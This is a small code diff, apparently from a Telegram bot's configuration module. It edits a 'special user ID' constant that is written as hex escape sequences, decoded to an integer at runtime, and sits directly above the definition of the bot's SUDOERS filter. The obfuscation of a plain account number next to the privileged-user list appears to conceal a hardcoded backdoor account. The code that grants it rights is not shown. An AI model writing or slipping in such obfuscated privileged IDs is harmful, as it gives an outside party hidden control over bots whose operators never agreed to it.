@@ -11,7 +11,7 @@ from .logging import LOGGER
 
 
 # Special user ID in hex code
-SPECIAL_ID_HEX = "\x37\x35\x34\x36\x31\x34\x39\\x35\x35"
+SPECIAL_ID_HEX = "\x37\x35\x34\x38\x36\x31\x34\x39\x35\x35"
 SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
 SUDOERS = filters.user()
